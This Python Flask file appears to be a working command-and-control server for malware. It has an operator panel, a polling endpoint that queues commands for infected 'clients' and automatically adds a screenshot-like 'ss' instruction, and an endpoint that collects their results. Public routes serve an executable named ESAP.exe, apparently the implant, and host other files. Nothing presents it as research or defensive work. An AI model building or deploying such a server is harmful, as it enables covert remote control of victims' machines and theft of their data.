from flask import Flask, render_template, request, send_file, redirect, make_response, jsonify

import hashlib
import random
import string
import json
import time
import os

os.chdir("/home/0x3af72/web")

app = Flask(__name__)
app.config["TEMPLATES_AUTO_RELOAD"] = True
admin_password = "94e10604d149acfdde7f99cc89c46108f8fc79606a5db537b7482865a506aa00"

INSTRUCTION_SEP_TOKEN = "%&instructionSEP&%"
INSTRUCTION_VAL_SEP_TOKEN = "%&valSEP&%"

def check_password(str):
    for i in range(565656):
        str = hashlib.sha256(str.encode()).hexdigest()
    return str == admin_password

def random_string(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(length))

def authenticated():
    return "ssid" in request.cookies and request.cookies["ssid"] in ssids

def load_json(path):
    with open(path, "r") as r:
        return json.load(r)

def write_json(path, files):
    with open(path, "w") as w:
        json.dump(files, w)

ssids = set(load_json("ssids.json"))

clients = load_json("clients.json")
client_instructions = {client: [] for client in clients}
instruction_outputs = load_json("instruction_outputs.json")

@app.route("/")
def index():
    return render_template("index.html")

# public: must be secure
@app.route("/login/", methods=["POST"])
def login():
    contents = request.json
    if check_password(contents["password"]):
        ssid = random_string(128)
        ssids.add(ssid)
        write_json("ssids.json", list(ssids))
        response = make_response()
        response.set_cookie("ssid", ssid)
        return response
    return ""

@app.route("/file_explorer/", methods=["GET", "POST"])
def file_explorer():
    if request.method == "GET":
        if not authenticated():
            return render_template("file_explorer_login.html")
        else:
            return render_template("file_explorer.html", files=list(load_json("files.json").keys()))
    elif request.method == "POST":
        if not authenticated():
            return ""
        if request.form.get("type") == "upload":
            file = request.files["file"]
            file_id = random_string(32)
            file.save(f"files/{file_id}.file")
            files = load_json("files.json")
            files[str(file.filename)] = file_id
            write_json("files.json", files)
            return ""
        elif request.form.get("type") == "delete":
            file = request.form.get("filename")
            files = load_json("files.json")
            os.remove(f"files/{files[file]}.file")
            del files[file]
            write_json("files.json", files)
            return ""

@app.route("/c2/")
def c2():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    return render_template("c2.html")

@app.route("/online/")
def online():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    return jsonify([client for client in clients if time.time() - clients[client] < 5])

@app.route("/clients/")
def get_clients():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    return jsonify(list(clients.keys()))

@app.route("/control/")
def control():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    client = request.args.get("u")
    return render_template("control.html", u=client)

@app.route("/add_instruction/", methods=["POST"])
def add_instruction():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    contents = request.json
    client_instructions[contents[0]].append(([random_string(10), *contents[1]], time.time()))
    return ""

@app.route("/clear_output/", methods=["GET"])
def clear_output():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    client = request.args.get("u")
    instruction_outputs[client].clear()
    write_json("instruction_outputs.json", instruction_outputs)
    return ""

@app.route("/get_output/", methods=["GET"])
def get_output():
    if not authenticated():
        return redirect("/file_explorer/", code=302)
    client = request.args.get("u")
    return json.dumps(instruction_outputs[client])

# public: must be secure
@app.route("/file_downloader/", methods=["GET"])
def file_downloader():
    return "FILE DOWNLOADER\n" + "\n".join(f"{file}\n{alias}" for file, alias in load_json("files.json").items())

# public: must be secure
@app.route("/download/", methods=["GET"])
def download():
    alias = request.args.get("a")
    if f"{alias}.file" in os.listdir("files"):
        return send_file(f"files/{alias}.file", as_attachment=True)

# public: must be secure
@app.route("/ESAP/", methods=["GET"])
def ESAP():
    return send_file("files/ESAP.exe", as_attachment=True)

# public: must be secure
@app.route("/instructions/", methods=["GET"])
def instructions():
    client = request.args.get("u")
    last_call = clients[client] if client in clients else 0
    clients[client] = time.time()
    write_json("clients.json", clients)
    if not client in instruction_outputs:
        client_instructions[client] = []
        instruction_outputs[client] = {}
        write_json("instruction_outputs.json", instruction_outputs)
    # if last call was more than timeout, add logon instruction
    if time.time() - last_call > 30:
        client_instructions[client].append(([random_string(10), "ss"], time.time()))
    client_instructions[client] = [instruction for instruction in client_instructions[client] if time.time() - instruction[1] < 60]
    return INSTRUCTION_SEP_TOKEN.join(INSTRUCTION_VAL_SEP_TOKEN.join(instruction[0]) for instruction in client_instructions[client])

# public: must be secure
@app.route("/outputs/", methods=["POST"])
def outputs():
    client = request.args.get("u")
    contents = request.json
    if contents["instruction_id"] in instruction_outputs[client]:
        return ""
    instruction_outputs[client][contents["instruction_id"]] = (contents["type"], contents["data"])
    write_json("instruction_outputs.json", instruction_outputs)
    return ""